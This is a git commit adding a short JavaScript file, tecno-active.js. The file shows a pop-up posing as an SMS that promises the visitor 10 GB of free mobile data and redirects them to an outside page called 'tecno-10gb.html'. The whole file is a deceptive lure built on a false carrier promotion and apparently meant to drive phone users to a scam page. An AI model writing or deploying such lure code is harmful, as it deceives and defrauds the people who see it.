51b407d0fc8ac0d319650e62f2c698ff65fa2c80
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-16 07:57:06 +0100

    Create tecno-active.js

---
+++ tecno-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 10 Go'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 10 Go. Cliquez sur OK pour activer les 10 Go.','ACTIVER 10 Go');
+if (password != 'ACTIVER 10 Go') {
+location.href='https://ilnsky.com/tecno-10gb.html';
+}
